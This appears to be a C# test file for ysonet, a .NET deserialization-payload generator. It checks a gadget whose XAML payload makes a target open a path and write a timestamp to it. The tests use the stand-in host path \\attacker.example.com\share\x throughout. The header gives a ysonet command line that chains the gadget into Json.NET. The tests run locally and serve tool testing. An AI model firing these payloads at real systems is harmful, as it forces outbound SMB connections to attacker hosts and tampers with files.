using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Text;
using System.Xml;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;

// Tests for the FileSystemInfoTimeSetter gadget.
//
// It keeps its own file rather than folding into Tests.cs. The shared matrices cover it like
// any other gadget, and the hand-written generation, facet and reader rows below are stricter
// than what those matrices assert, so nothing is dropped for being redundant.
//
// WHAT THE RUNTIME-EFFECT ROW IS HERE. The gadget's effect is that the target OPENS the
// path and writes a timestamp to it. Against a UNC path the open is the outbound SMB
// session; against a local path the same call succeeds and the timestamp write is left
// behind. So the sink is observed LOCALLY, on a real test-owned file or directory, by
// requiring its real timestamp to equal the payload's constant afterwards - which is
// File/Directory.SetXxxTimeUtc provably having run, with nothing leaving the machine.
// That is stronger than the FileSystemInfo short-name row, which can only infer its
// call from a returned long name.
//
// The remote half (a real SMB callback against a UNC path) belongs to the opt-in OOB tier,
// as one row in the shared UncCallbackRows table in Tests.cs, so nothing here sends anything
// off this machine.
//
// Fired by hand as well, and recorded here because no automated row covers it: the
// bridged chain really does reach the sink through another gadget. On 4.8.1,
//   ysonet.exe -g WorkflowDesigner -bgc FileSystemInfoTimeSetter -f Json.NET --variant 2
//              -c <a local file> -t
// changed that file's timestamp to the payload's constant and then threw
// InvalidCastException("Unable to cast object of type 'System.IO.FileInfo' to type
// ...Hashtable"), which is WorkflowDesigner's own cast AFTER XamlReader.Load returned our
// object. The automated bridged row below stays at generation plus document survival,
// because WorkflowDesigner's target constructs a WPF Application and has to be fired in a
// child process.
namespace ysonet.Tests
{
    internal partial class Tests
    {
        private const string FsiTimeSetterGadget = "FileSystemInfoTimeSetter";

        // A host that cannot resolve, for the rows that must never touch the network. RFC 2606
        // reserves .invalid for exactly this.
        private const string FsiTimeSetterUnroutablePath = @"\\ysonet-no-such-host.invalid\share\x";

        // Unique names inside this run's artifact directory, so two cells never race.
        private static int _fsiTimeSetterArtifactCounter;

        private static void RunFileSystemInfoTimeSetterTests()
        {
            Run("FileSystemInfoTimeSetter generates every variant, member and minify state",
                FileSystemInfoTimeSetterGenerates);
            Run("FileSystemInfoTimeSetter emits the x:Arguments document in the right order",
                FileSystemInfoTimeSetterEmitsTheRightDocument);
            Run("FileSystemInfoTimeSetter writes the timestamp on a real path",
                FileSystemInfoTimeSetterWritesATimestamp);
            Run("FileSystemInfoTimeSetter self-tests through the product's own -t",
                FileSystemInfoTimeSetterSelfTestOpensThePath);
            Run("FileSystemInfoTimeSetter refuses every formatter but Xaml",
                FileSystemInfoTimeSetterRefusesEveryOtherFormatter);
            Run("FileSystemInfoTimeSetter rejects a member it cannot emit",
                FileSystemInfoTimeSetterRejectsAnUnknownMember);
            Run("FileSystemInfoTimeSetter takes the path as typed",
                FileSystemInfoTimeSetterTakesThePathAsTyped);
            Run("FileSystemInfoTimeSetter refuses a path minification would rewrite",
                FileSystemInfoTimeSetterRefusesLossyMinification);
            Run("FileSystemInfoTimeSetter resolves nothing at generation time",
                FileSystemInfoTimeSetterIsNotResolvedAtGenerationTime);
            Run("FileSystemInfoTimeSetter reaches other formatters through a bridge",
                FileSystemInfoTimeSetterReachesOtherFormattersThroughWorkflowDesigner);
            Run("FileSystemInfoTimeSetter drives the interactive editor correctly",
                FileSystemInfoTimeSetterEditsInteractively);
            Run("FileSystemInfoTimeSetter declares real facets",
                FileSystemInfoTimeSetterDeclaresRealFacets);
        }

        // ---- helpers -----------------------------------------------------------

        private static InputArgs FsiTimeSetterInput(string path, bool minify, params string[] extra)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = path;
            ia.Test = false;
            ia.Minify = minify;
            if (extra != null && extra.Length > 0)
                ia.ExtraArguments = new List<string>(extra);
            return ia;
        }

        private static string[] FsiTimeSetterOptions(int variant, string member)
        {
            return new[]
            {
                "--" + FileSystemInfoTimeSetterGenerator.VariantOptionName, variant.ToString(),
                "--" + FileSystemInfoTimeSetterGenerator.MemberOptionName, member,
            };
        }

        // A fresh generator per call on purpose: Init() parses options into instance state, so a
        // reused instance would carry the previous --variant/--member into the next cell. This is
        // also how PayloadRunner really calls a gadget.
        private static string BuildFsiTimeSetterPayload(InputArgs ia)
        {
            return (string)GadgetRegistry.CreateGadgetInstance(FsiTimeSetterGadget)
                .GenerateWithInit(Formatters.Xaml, ia);
        }

        private static RunResult RunFsiTimeSetter(InputArgs ia)
        {
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = FsiTimeSetterGadget,
                FormatterName = Formatters.Xaml,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The UTC value the file system must hold after the payload fires, derived the way the
        // framework derives it rather than hardcoded:
        //   - the three *Utc setters hand the literal straight to File/Directory.SetXxxTimeUtc,
        //     whose ToFileTimeUtc() treats an unspecified Kind as UTC;
        //   - the three local setters assign their Utc twin after value.ToUniversalTime().
        // On a UTC machine the two branches coincide, which is why the conversion is computed
        // instead of assumed.
        private static DateTime FsiTimeSetterExpectedUtc(string member)
        {
            DateTime literal = DateTime.ParseExact(
                FileSystemInfoTimeSetterGenerator.TimestampLiteral,
                "o", CultureInfo.InvariantCulture, DateTimeStyles.RoundtripKind);

            return member.EndsWith("Utc", StringComparison.Ordinal)
                ? literal
                : literal.ToUniversalTime();
        }

        // The real timestamp the selected member writes, read back off the artifact.
        private static DateTime FsiTimeSetterReadUtc(string member, string path, bool isDirectory)
        {
            if (member.StartsWith("Creation", StringComparison.Ordinal))
                return isDirectory ? Directory.GetCreationTimeUtc(path) : File.GetCreationTimeUtc(path);
            if (member.StartsWith("LastAccess", StringComparison.Ordinal))
                return isDirectory ? Directory.GetLastAccessTimeUtc(path) : File.GetLastAccessTimeUtc(path);
            return isDirectory ? Directory.GetLastWriteTimeUtc(path) : File.GetLastWriteTimeUtc(path);
        }

        // A baseline every member can be set to, far from the payload's constant, so a cell that
        // never fired cannot pass on a coincidence.
        private static readonly DateTime FsiTimeSetterBaselineUtc =
            new DateTime(2020, 1, 1, 0, 0, 0, DateTimeKind.Utc);

        private static void FsiTimeSetterStampBaseline(string path, bool isDirectory)
        {
            if (isDirectory)
            {
                Directory.SetCreationTimeUtc(path, FsiTimeSetterBaselineUtc);
                Directory.SetLastAccessTimeUtc(path, FsiTimeSetterBaselineUtc);
                Directory.SetLastWriteTimeUtc(path, FsiTimeSetterBaselineUtc);
            }
            else
            {
                File.SetCreationTimeUtc(path, FsiTimeSetterBaselineUtc);
                File.SetLastAccessTimeUtc(path, FsiTimeSetterBaselineUtc);
                File.SetLastWriteTimeUtc(path, FsiTimeSetterBaselineUtc);
            }
        }

        // A real, test-owned file or directory in this run's artifact namespace. The caller
        // removes it in a finally.
        private static string FsiTimeSetterNewArtifact(bool isDirectory)
        {
            int n = System.Threading.Interlocked.Increment(ref _fsiTimeSetterArtifactCounter);
            string name = "fsi_timesetter_" + n + (isDirectory ? "_dir" : ".txt");

            string path;
            if (isDirectory)
            {
                path = TestArtifactPath(name);
                Directory.CreateDirectory(path);
            }
            else
            {
                path = WriteTestArtifact(name, "ysonet time setter fixture");
            }

            FsiTimeSetterStampBaseline(path, isDirectory);
            return path;
        }

        private static void FsiTimeSetterRemoveArtifact(string path, bool isDirectory)
        {
            if (isDirectory) SafeDeleteDir(path); else SafeDelete(path);
        }

        private static XmlDocument FsiTimeSetterParse(string payload)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(payload);
            return doc;
        }

        private static void FsiTimeSetterAssertThrowsWith(Action action, string needle, string msg)
        {
            string seen = null;
            try { action(); }
            catch (Exception e)
            {
                Exception inner = e;
                while (inner.InnerException != null) inner = inner.InnerException;
                seen = inner.GetType().Name + ": " + inner.Message;
            }
            AssertTrue(seen != null, msg + " (nothing was thrown)");
            AssertTrue(seen != null && seen.IndexOf(needle, StringComparison.OrdinalIgnoreCase) >= 0,
                msg + " (wanted \"" + needle + "\", got \"" + seen + "\")");
        }

        // ---- rows --------------------------------------------------------------

        // Generation through the product's own runner, for the whole option surface:
        // 2 variants x 6 members x minify on/off.
        private static void FileSystemInfoTimeSetterGenerates()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(FsiTimeSetterGadget);
            AssertTrue(gen != null, "it resolves by name");

            AssertEqual(1, gen.SupportedFormatters().Count, "it advertises exactly one formatter");
            AssertTrue(gen.IsSupported(Formatters.Xaml), "and that formatter is Xaml");

            foreach (int variant in new[]
            {
                FileSystemInfoTimeSetterGenerator.VariantDirectoryInfo,
                FileSystemInfoTimeSetterGenerator.VariantFileInfo,
            })
                foreach (string member in FileSystemInfoTimeSetterGenerator.TimestampMembers)
                    foreach (bool minify in new[] { false, true })
                    {
                        string cell = "variant " + variant + " " + member + (minify ? " +minify" : "");
                        RunResult res = RunFsiTimeSetter(FsiTimeSetterInput(
                            @"\\attacker.example.com\share\x", minify,
                            FsiTimeSetterOptions(variant, member)));

                        AssertTrue(res.Success, cell + " generates: " + res.ErrorMessage);
                        AssertTrue(!RawIsEmpty(res.Raw), cell + " payload is not empty");
                    }
        }

        // The assertion a generation matrix cannot make. The document shape IS the technique:
        // x:Arguments has to come first (neither carrier has a parameterless constructor, so
        // nothing exists to assign to until the writer has read the arguments), and the member
        // has to be a property ELEMENT rather than an attribute on the start tag. Both mistakes
        // still generate a valid-looking payload that can never fire.
        private static void FileSystemInfoTimeSetterEmitsTheRightDocument()
        {
            foreach (int variant in new[]
            {
                FileSystemInfoTimeSetterGenerator.VariantDirectoryInfo,
                FileSystemInfoTimeSetterGenerator.VariantFileInfo,
            })
            {
                string carrier = variant == FileSystemInfoTimeSetterGenerator.VariantFileInfo
                    ? "FileInfo" : "DirectoryInfo";

                foreach (string member in FileSystemInfoTimeSetterGenerator.TimestampMembers)
                {
                    string cell = carrier + "." + member;
                    string path = @"\\attacker.example.com\share\x";
                    XmlDocument doc = FsiTimeSetterParse(BuildFsiTimeSetterPayload(
                        FsiTimeSetterInput(path, false, FsiTimeSetterOptions(variant, member))));

                    XmlElement root = doc.DocumentElement;
                    AssertEqual(carrier, root.LocalName, cell + ": the root element names the carrier");
                    AssertEqual(FileSystemInfoTimeSetterGenerator.ClrNamespaceIO, root.NamespaceURI,
                        cell + ": the carrier comes from System.IO in mscorlib");

                    var elements = new List<XmlElement>();
                    foreach (XmlNode child in root.ChildNodes)
                        if (child is XmlElement)
                            elements.Add((XmlElement)child);

                    AssertEqual(2, elements.Count, cell + ": the document has exactly two members");

                    AssertEqual("Arguments", elements[0].LocalName,
                        cell + ": the constructor arguments come FIRST");
                    AssertEqual(FileSystemInfoTimeSetterGenerator.XamlLanguageNamespace,
                        elements[0].NamespaceURI, cell + ": and they are the XAML language x:Arguments");

                    AssertEqual(carrier + "." + member, elements[1].LocalName,
                        cell + ": the timestamp is a property ELEMENT named on the carrier's own type");
                    AssertEqual(FileSystemInfoTimeSetterGenerator.ClrNamespaceIO,
                        elements[1].NamespaceURI, cell + ": in the carrier's namespace");
                    AssertEqual(FileSystemInfoTimeSetterGenerator.TimestampLiteral,
                        elements[1].InnerText, cell + ": carrying the fixed round-trip timestamp");

                    // The member must NOT also be an attribute: that form asks the writer to
                    // assign before the object exists.
                    AssertTrue(root.GetAttribute(member) == "",
                        cell + ": the member is not written as a start-tag attribute");

                    XmlElement argument = null;
                    foreach (XmlNode child in elements[0].ChildNodes)
                        if (child is XmlElement) { argument = (XmlElement)child; break; }

                    AssertTrue(argument != null, cell + ": the arguments carry one element");
                    AssertEqual("String", argument.LocalName, cell + ": the argument is a System.String");
                    AssertEqual(FileSystemInfoTimeSetterGenerator.ClrNamespaceSystem,
                        argument.NamespaceURI, cell + ": from System in mscorlib");
                    AssertEqual(path, argument.InnerText, cell + ": holding the operator's path");
                    AssertEqual("preserve", argument.GetAttribute("space", "http://www.w3.org/XML/1998/namespace"),
                        cell + ": with whitespace preserved, because the path is the payload");
                }
            }
        }

        // THE runtime-effect row, and the one that earns the version facet.
        //
        // 2 variants x 6 members x minify = 24 cells. Each one creates a real test-owned file or
        // directory, stamps a baseline far from the payload's constant, deserializes the payload
        // with the reader a target would use, and requires the artifact's REAL timestamp to be
        // the payload's constant afterwards. That is File/Directory.SetXxxTimeUtc proven to have
        // run, which is the exact sink; nothing leaves the machine.
        private static void FileSystemInfoTimeSetterWritesATimestamp()
        {
            var failures = new List<string>();

            foreach (int variant in new[]
            {
                FileSystemInfoTimeSetterGenerator.VariantDirectoryInfo,
                FileSystemInfoTimeSetterGenerator.VariantFileInfo,
            })
            {
                bool isDirectory = variant == FileSystemInfoTimeSetterGenerator.VariantDirectoryInfo;

                foreach (string member in FileSystemInfoTimeSetterGenerator.TimestampMembers)
                    foreach (bool minify in new[] { false, true })
                    {
                        string cell = (isDirectory ? "DirectoryInfo " : "FileInfo ") + member
                            + (minify ? " +minify" : "");
                        string artifact = null;
                        try
                        {
                            artifact = FsiTimeSetterNewArtifact(isDirectory);
                            DateTime expected = FsiTimeSetterExpectedUtc(member);

                            if (FsiTimeSetterReadUtc(member, artifact, isDirectory) == expected)
                            {
                                failures.Add(cell + " -> the baseline already equals the payload's "
                                    + "constant, so this cell could not prove anything");
                                continue;
                            }

                            string payload = BuildFsiTimeSetterPayload(FsiTimeSetterInput(
                                artifact, minify, FsiTimeSetterOptions(variant, member)));

                            // The reader a target would use. Throwing here would be a real
                            // failure: this payload constructs the carrier and assigns one
                            // member, and neither step should raise.
                            SerializersHelper.Xaml_deserialize(payload);

                            DateTime seen = FsiTimeSetterReadUtc(member, artifact, isDirectory);
                            if (seen != expected)
                            {
                                failures.Add(cell + " -> " + member + " is "
                                    + seen.ToString("o", CultureInfo.InvariantCulture) + ", wanted "
                                    + expected.ToString("o", CultureInfo.InvariantCulture));
                                continue;
                            }

                            // Recorded, not asserted: the FULL run reports the build each gadget
                            // was observed firing on, which is where the version facet comes from.
                            RuntimeBuild.RecordFired(FsiTimeSetterGadget);
                        }
                        catch (Exception e)
                        {
                            failures.Add(cell + " -> " + e.GetType().Name + ": " + e.Message);
                        }
                        finally
                        {
                            FsiTimeSetterRemoveArtifact(artifact, isDirectory);
                        }
                    }
            }

            AssertTrue(failures.Count == 0,
                "FileSystemInfoTimeSetter effect cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // -t is accepted and it really opens the path, so drive it through the product rather
        // than through a direct deserialize: that is what exercises the self-test wiring, and
        // the probe-first order that refuses a rewritten path BEFORE -t can open the wrong one.
        private static void FileSystemInfoTimeSetterSelfTestOpensThePath()
        {
            AssertTrue(PayloadReader.CanRead(Formatters.Xaml),
                "Xaml is a format -t can read back at all");

            string artifact = null;
            try
            {
                artifact = FsiTimeSetterNewArtifact(false);

                InputArgs ia = FsiTimeSetterInput(artifact, false, FsiTimeSetterOptions(
                    FileSystemInfoTimeSetterGenerator.VariantFileInfo,
                    FileSystemInfoTimeSetterGenerator.DefaultMemberName));
                ia.Test = true;

                RunResult res = RunFsiTimeSetter(ia);
                AssertTrue(res.Success, "-t completes and still returns a payload: " + res.ErrorMessage);
                AssertTrue(!RawIsEmpty(res.Raw), "-t still returns the payload");

                AssertEqual(
                    FsiTimeSetterExpectedUtc(FileSystemInfoTimeSetterGenerator.DefaultMemberName),
                    File.GetLastWriteTimeUtc(artifact),
                    "-t deserialized the payload here, so THIS machine opened the path and wrote it");
            }
            finally
            {
                FsiTimeSetterRemoveArtifact(artifact, false);
            }

            // The other half of the probe-first order: a path --minify would rewrite is refused
            // and NOTHING is opened, even with -t asked for. The artifact is created with the
            // trailing space trimmed off (Windows cannot hold a trailing space in a name), so the
            // path the payload would carry after minification is the one that exists - which is
            // exactly the wrong file this ordering protects.
            string neighbour = null;
            try
            {
                neighbour = FsiTimeSetterNewArtifact(false);

                InputArgs lossy = FsiTimeSetterInput(neighbour + " ", false, FsiTimeSetterOptions(
                    FileSystemInfoTimeSetterGenerator.VariantFileInfo,
                    FileSystemInfoTimeSetterGenerator.DefaultMemberName));
                lossy.Test = true;
                lossy.Minify = true;

                RunResult res = RunFsiTimeSetter(lossy);
                AssertTrue(!res.Success, "a path minification rewrites is refused even with -t");
                AssertEqual(FsiTimeSetterBaselineUtc, File.GetLastWriteTimeUtc(neighbour),
                    "and the refusal happened BEFORE -t could open the rewritten path");
            }
            finally
            {
                FsiTimeSetterRemoveArtifact(neighbour, false);
            }
        }

        // The structural exclusion, made executable. Every other formatter in the project must
        // refuse by name, so a later "let us try Json.NET" edit cannot silently advertise a cell
        // that can never fire. Reflected over the Formatters constants rather than listed, so a
        // formatter added to the project later is covered without touching this row.
        private static void FileSystemInfoTimeSetterRefusesEveryOtherFormatter()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(FsiTimeSetterGadget);
            int checkedCount = 0;

            foreach (FieldInfo f in typeof(Formatters).GetFields(BindingFlags.Public | BindingFlags.Static))
            {
                string formatter = (string)f.GetValue(null);
                if (string.IsNullOrEmpty(formatter)
                    || string.Equals(formatter, Formatters.Xaml, StringComparison.OrdinalIgnoreCase))
                    continue;

                checkedCount++;
                AssertTrue(!gen.IsSupported(formatter), formatter + " is not advertised");

                FsiTimeSetterAssertThrowsWith(
                    () => GadgetRegistry.CreateGadgetInstance(FsiTimeSetterGadget)
                        .GenerateWithInit(formatter, FsiTimeSetterInput(@"\\h\s\x", false)),
                    "not supported",
                    formatter + " is refused by name rather than emitted");
            }

            AssertTrue(checkedCount >= 16,
                "every other formatter constant was checked (saw " + checkedCount + ")");
        }

        // A "cannot emit" refusal, not validation of the operator's target: there is no seventh
        // timestamp member to name, so the message lists the six that exist.
        private static void FileSystemInfoTimeSetterRejectsAnUnknownMember()
        {
            FsiTimeSetterAssertThrowsWith(
                () => BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\x", false,
                    "--" + FileSystemInfoTimeSetterGenerator.MemberOptionName, "nonsense")),
                "nonsense",
                "an unknown member is refused");

            foreach (string member in FileSystemInfoTimeSetterGenerator.TimestampMembers)
            {
                string message = null;
                try
                {
                    BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\x", false,
                        "--" + FileSystemInfoTimeSetterGenerator.MemberOptionName, "nonsense"));
                }
                catch (Exception e) { message = e.Message; }

                AssertTrue(message != null && message.IndexOf(member, StringComparison.Ordinal) >= 0,
                    "the refusal names " + member + " as a choice");
            }

            // Case is not part of the choice: a member the operator spelled differently still
            // resolves to the real member name, because only the six names exist to emit.
            string payload = BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\x", false,
                "--" + FileSystemInfoTimeSetterGenerator.MemberOptionName, "lastaccesstimeutc"));
            AssertTrue(payload.IndexOf(
                    "." + FileSystemInfoTimeSetterGenerator.LastAccessTimeUtcMember + ">",
                    StringComparison.Ordinal) >= 0,
                "a differently cased member name resolves to the real one");

            // An empty -c is the only other refusal, and it is also a "cannot emit" one.
            FsiTimeSetterAssertThrowsWith(
                () => BuildFsiTimeSetterPayload(FsiTimeSetterInput("", false)),
                "non-empty",
                "an empty path is refused, because there is nothing to build a payload around");
        }

        // Operator input is documented, not policed. Anything the operator types has to arrive
        // at the target exactly as typed, and nothing about the SHAPE of the path is refused -
        // in particular this gadget needs no short-name ("~") component, which is the whole
        // difference from the public sibling.
        private static void FileSystemInfoTimeSetterTakesThePathAsTyped()
        {
            foreach (string path in new[]
            {
                @"\\attacker.example.com\share\x",          // no "~" anywhere
                @"C:\Program Files\Example\x",              // a bare Windows path, with a space
                @"\\attacker.example.com\share\a&b<c>d",    // characters the XML escaper handles
                @"\\attacker.example.com\share\aaaaaa~1",   // a short name is accepted too
            })
            {
                string payload = BuildFsiTimeSetterPayload(FsiTimeSetterInput(path, false));

                List<string> values = MinifiedTextGuard.XmlTextValues(payload, false);
                AssertTrue(values.Contains(path),
                    "the decoded document carries \"" + path + "\" exactly: " + Truncate(payload, 300));
            }

            // --rawinput drops the escaping, for an operator who escaped the value themselves.
            string raw = BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\a&amp;b", false,
                "--" + FileSystemInfoTimeSetterGenerator.RawInputOptionName));
            AssertTrue(raw.IndexOf(@"\\h\s\a&amp;b", StringComparison.Ordinal) >= 0,
                "--rawinput puts the text into the template untouched");
            AssertTrue(raw.IndexOf("&amp;amp;", StringComparison.Ordinal) < 0,
                "and does not escape it a second time");
        }

        // Prove the fidelity guard FIRES rather than assuming it does. The path is the payload,
        // so a payload whose text was rewritten is worse than no payload: it would deserialize
        // cleanly and open something else.
        private static void FileSystemInfoTimeSetterRefusesLossyMinification()
        {
            FsiTimeSetterAssertThrowsWith(
                () => BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\x ", true)),
                "--minify",
                "a trailing space is trimmed by the XML minifier, so the payload is refused");

            // Without --minify nothing trims it, so the same path builds.
            string ok = BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\x ", false));
            AssertTrue(MinifiedTextGuard.XmlTextValues(ok, false).Contains(@"\\h\s\x "),
                "and the same path is delivered intact without --minify");

            // A carriage return cannot be delivered by ANY XML document, minified or not: line
            // ending normalization is mandatory in XML, so the target's parser drops it too.
            FsiTimeSetterAssertThrowsWith(
                () => BuildFsiTimeSetterPayload(FsiTimeSetterInput("\\\\h\\s\\a\rb", false)),
                "carriage return",
                "a carriage return is refused, because XML normalizes it away on the target too");

            // --rawinput hands the operator responsibility for the exact bytes, so the guard
            // steps aside rather than refusing text it has nothing to compare against.
            string rawMinified = BuildFsiTimeSetterPayload(FsiTimeSetterInput(@"\\h\s\x ", true,
                "--" + FileSystemInfoTimeSetterGenerator.RawInputOptionName));
            AssertTrue(!string.IsNullOrEmpty(rawMinified),
                "--rawinput builds even when the text would not survive, because the operator owns it");
        }

        // The generation-only control: building a payload must never resolve, open or contact
        // anything. A host that cannot resolve would cost seconds if the gadget touched it.
        private static void FileSystemInfoTimeSetterIsNotResolvedAtGenerationTime()
        {
            var clock = System.Diagnostics.Stopwatch.StartNew();
            string payload = BuildFsiTimeSetterPayload(
                FsiTimeSetterInput(FsiTimeSetterUnroutablePath, false));
            clock.Stop();

            AssertTrue(payload.IndexOf(FsiTimeSetterUnroutablePath, StringComparison.Ordinal) >= 0,
                "an unroutable host still produces a payload naming it");
            AssertTrue(clock.ElapsedMilliseconds < 2000,
                "and generation did not wait for a name resolution (" + clock.ElapsedMilliseconds + " ms)");

            // A local path that does not exist is equally untouched: nothing is created.
            string missing = TestArtifactPath("fsi_timesetter_never_created.txt");
            BuildFsiTimeSetterPayload(FsiTimeSetterInput(missing, false));
            AssertTrue(!File.Exists(missing), "generation created no file for a path that does not exist");
        }

        // Xaml is the only formatter this gadget can produce, so every other format is reached by
        // CHAINING it into a Xaml-consuming bridge. WorkflowDesigner's own eight formatters are
        // what that buys. Firing the chain is not automated here (its target constructs a WPF
        // Application, which needs a child process); the hand-run evidence is in the file header.
        private static void FileSystemInfoTimeSetterReachesOtherFormattersThroughWorkflowDesigner()
        {
            const string consumer = "WorkflowDesigner";
            IGenerator wd = GadgetRegistry.CreateGadgetInstance(consumer);
            AssertTrue(wd != null, consumer + " is available as a bridge consumer");
            AssertEqual(Formatters.Xaml, wd.SupportedBridgedFormatter(),
                "and it takes a Xaml document, which is what this gadget produces");

            var failures = new List<string>();
            foreach (string formatter in wd.SupportedFormatters())
            {
                foreach (bool minify in new[] { false, true })
                {
                    string cell = formatter + (minify ? " +minify" : "");
                    InputArgs ia = FsiTimeSetterInput(@"\\attacker.example.com\share\x", minify,
                        FsiTimeSetterOptions(FileSystemInfoTimeSetterGenerator.VariantFileInfo,
                            FileSystemInfoTimeSetterGenerator.LastAccessTimeUtcMember));

                    RunResult res = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = consumer,
                        BridgedGadgetChain = FsiTimeSetterGadget,
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    });

                    if (!res.Success || RawIsEmpty(res.Raw))
                    {
                        failures.Add(cell + " -> " + (res.Success ? "empty" : res.ErrorMessage));
                        continue;
                    }

                    // The Lz4 flavour is compressed, so nothing is readable in its bytes; its
                    // uncompressed twin covers the document.
                    if (string.Equals(formatter, Formatters.MessagePackTypelessLz4,
                        StringComparison.OrdinalIgnoreCase))
                        continue;

                    string text = Encoding.UTF8.GetString(Bytes(res.Raw));

                    // Prefix-free tokens: the inner document travels escaped for whichever
                    // literal it lands in, and --minify renames its namespace prefixes.
                    foreach (string token in new[]
                    {
                        ":Arguments",
                        "FileInfo." + FileSystemInfoTimeSetterGenerator.LastAccessTimeUtcMember,
                        FileSystemInfoTimeSetterGenerator.TimestampLiteral,
                        "attacker.example.com",
                    })
                        if (text.IndexOf(token, StringComparison.Ordinal) < 0)
                            failures.Add(cell + " -> the inner document lost \"" + token + "\"");

                    // No gadget may name itself in a payload an operator ships.
                    if (text.IndexOf(FsiTimeSetterGadget, StringComparison.Ordinal) >= 0)
                        failures.Add(cell + " -> the payload names this gadget");
                }
            }

            AssertTrue(failures.Count == 0,
                "bridged delivery cells failed (" + failures.Count + "):\n  "
                    + string.Join("\n  ", failures.ToArray()));
        }

        // The interactive editor is a separate surface from the CLI and it fails QUIETLY. Its
        // option-choice heuristic reads the help TEXT (NDesk.Options records neither choices nor
        // defaults), it pre-fills the field with what it recovered, and CollectGadget then EMITS
        // that value - so a menu built out of prose fragments, or a truncated default, ships a
        // well-formed payload that never fires while the identical CLI command works.
        private static void FileSystemInfoTimeSetterEditsInteractively()
        {
            // The module is a discovery surface of its own: hidden without --prv, offered with it.
            AssertTrue(Has(new Wizard(null, new MemoryStream(), false).VisibleGadgetNames(),
                    FsiTimeSetterGadget),
                "the wizard offers it with no flag at all");
            AssertTrue(Has(new Wizard(null, new MemoryStream(), true).VisibleGadgetNames(),
                    FsiTimeSetterGadget),
                "and --prv neither hides nor duplicates it");

            var editor = new ModuleEditor(null, null, true, null, null, true);
            var fields = editor.BuildFieldsForTest(FsiTimeSetterGadget);

            EditableField command = FindEditable(fields, "command");
            EditableField variant = FindEditable(fields, "variant");
            EditableField member = FindEditable(fields,
                FileSystemInfoTimeSetterGenerator.MemberOptionName);
            AssertTrue(command != null && variant != null && member != null,
                "the editor offers the command, variant and member settings");

            List<GadgetVariant> declared = Gadget(FsiTimeSetterGadget).Variants();
            AssertTrue(variant.Choices != null && variant.Choices.Count == declared.Count,
                "both carrier labels are offered");
            AssertEqual(declared[0].Label, variant.Value,
                "and the editor starts on the same variant the CLI defaults to");

            // The menu that the heuristic builds from the help text: exactly the six real member
            // names, in the order the gadget declares them, and nothing else.
            AssertTrue(member.Choices != null,
                "the member setting offers a menu rather than free text");
            AssertEqual(FileSystemInfoTimeSetterGenerator.TimestampMembers.Length,
                member.Choices.Count,
                "the menu has exactly the six members: "
                    + string.Join(" | ", member.Choices.ToArray()));
            for (int i = 0; i < FileSystemInfoTimeSetterGenerator.TimestampMembers.Length; i++)
                AssertEqual(FileSystemInfoTimeSetterGenerator.TimestampMembers[i], member.Choices[i],
                    "menu entry " + (i + 1) + " is a real member name");
            AssertEqual(FileSystemInfoTimeSetterGenerator.DefaultMemberName, member.Value,
                "the recovered default is the whole member name, not a truncated one");

            // The recovered default is EMITTED, so it has to build the same payload the CLI
            // default builds. A truncation the eye would miss fails here.
            command.Value = @"\\attacker.example.com\share\x";
            string line = editor.GadgetCommandLineForTest();
            AssertTrue(line.Contains("--" + FileSystemInfoTimeSetterGenerator.MemberOptionName
                    + " " + FileSystemInfoTimeSetterGenerator.DefaultMemberName),
                "the echoed command line carries the default member: " + line);

            AssertEqual(
                BuildFsiTimeSetterPayload(FsiTimeSetterInput(command.Value, false)),
                BuildFsiTimeSetterPayload(FsiTimeSetterInput(command.Value, false,
                    "--" + FileSystemInfoTimeSetterGenerator.VariantOptionName,
                    FileSystemInfoTimeSetterGenerator.VariantDirectoryInfo.ToString(),
                    "--" + FileSystemInfoTimeSetterGenerator.MemberOptionName, member.Value)),
                "the editor's pre-filled settings build exactly the CLI default payload");

            // And a changed selection reaches the command line as the number, not the label.
            variant.Value = declared[1].Label;
            member.Value = FileSystemInfoTimeSetterGenerator.CreationTimeUtcMember;
            string switched = editor.GadgetCommandLineForTest();
            AssertTrue(switched.Contains(" " + FileSystemInfoTimeSetterGenerator.VariantFileInfo),
                "switching the carrier emits the variant NUMBER: " + switched);
            AssertTrue(!switched.Contains(declared[1].Label),
                "the human label never leaks into the command line: " + switched);
            AssertTrue(switched.Contains("--" + FileSystemInfoTimeSetterGenerator.MemberOptionName
                    + " " + FileSystemInfoTimeSetterGenerator.CreationTimeUtcMember),
                "and the chosen member is emitted: " + switched);
        }

        // Facets, labels and command input drive the category search, the help and the
        // interactive prompt, so a wrong value misleads the operator.
        private static void FileSystemInfoTimeSetterDeclaresRealFacets()
        {
            IGenerator gen = GadgetRegistry.CreateGadgetInstance(FsiTimeSetterGadget);

            AssertEqual(CommandInputType.UncPath, gen.CommandInput(),
                "-c is a UNC path the target reaches over SMB");
            AssertEqual(PayloadInput.UncPath, GadgetFacetReader.DeriveInput(gen.CommandInput()),
                "which derives the unc-path input facet");

            GadgetFacetSet facets = gen.Facets();
            AssertTrue(facets.Kinds.Contains(PayloadKind.Network),
                "the open of a UNC path is an outbound SMB session");
            AssertTrue(facets.Kinds.Contains(PayloadKind.FileSystem),
                "and the setter really writes a timestamp, which the effect row observes");
            AssertTrue(!facets.Kinds.Contains(PayloadKind.Uncategorized), "no uncategorized kind");
            AssertTrue(!facets.Requirements.Contains(GadgetRequirement.Uncategorized),
                "the requirements are real");
            AssertTrue(facets.Requirements.Contains(GadgetRequirement.BuiltIn),
                "mscorlib only, so it is built in");
            AssertTrue(!facets.Versions.Contains(RuntimeVersion.Unspecified),
